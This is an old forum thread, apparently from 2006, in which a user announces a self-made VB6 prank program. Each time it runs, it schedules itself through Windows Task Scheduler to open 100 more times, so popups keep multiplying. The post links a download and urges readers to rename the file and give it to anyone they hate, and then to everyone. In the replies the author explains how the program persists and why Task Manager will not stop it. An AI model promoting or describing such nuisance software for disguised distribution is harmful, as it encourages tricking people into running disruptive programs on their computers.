channel.title: Atomic PopupScheduler v.1
channel.description:
(Made by me in VB6)
Remember my old "You are an idiot!" program? Now I made a different one. In this one, you open the program, and it tells Windows to open itself 100 random times through out the day.
So basically, the first time it opens may be at 1:13, the next time might be at 2:34, and so on, 100 times through out the day. It does this when it opens, meaning each and every time it opens itself, it schedules it to open 100 more times in the day.
So the first time you open it, it sets it to open 100 times. And for each of those times it opens, it sets it to open yet another 100 times, making it 1000 times. See where this is going? It will start out small, and slowly infect your computer, opening popups everywhere, while scheduling even more popups.
You might want to open this on your own computer to test how it works (but this is your choice!). Then just give it to anyone you hate. Just be sure you rename it to something else.
[url=http://putstuff.putfile.com/16811/9617128]http://putstuff.putfile.com/16811/9617128[/url]
Enjoy! And remember, give it to EVERYONE!

item.title: Atomic PopupScheduler v.1
item.dc:creator: @Zach1188 Zach1188
item.description:
@Zach1188 wrote:

bloodrayne:

OK, I downloaded it. Ill start trying to get red of it now:)[br][size=1]Posted at: 28 November 2006, 18:30:28[/size][hr]I deleted it from scheduled tasks…Um does that stop it?

Yes, it would stop it, but the average user would not think of that. This is program is made for the average idiot.

Read full topic

item.title: Atomic PopupScheduler v.1
item.dc:creator: @Zach1188 Zach1188
item.description:
@Zach1188 wrote:

Um, it’s not a program that opens itself. It schedules WinXP to open it. So no, task manager wouldn’t do shit.

Read full topic
